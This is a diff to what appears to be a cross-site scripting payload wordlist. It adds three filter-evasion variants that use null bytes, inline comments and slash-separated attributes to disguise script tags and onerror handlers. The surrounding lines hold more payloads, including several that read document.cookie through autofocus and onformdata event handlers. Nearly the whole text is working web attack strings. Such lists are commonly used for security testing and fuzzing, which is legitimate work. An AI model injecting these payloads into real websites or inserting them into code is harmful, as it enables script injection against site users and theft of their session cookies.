@@ -1,5 +1,8 @@
 ;<script>alert(1)</script>
 ;<sc%00ript>alert/**/(1)</script>
+;<sc%00ript/test='asdf'>alert/**/(1)</script>
+<sc\u0000ript/test";"'asdf'>alert/**/(1)
+;</script><img/test='asdf'/sr%00c=''/on%00error=prompt>
 #<script>alert(1)</script>
 1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
 "><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
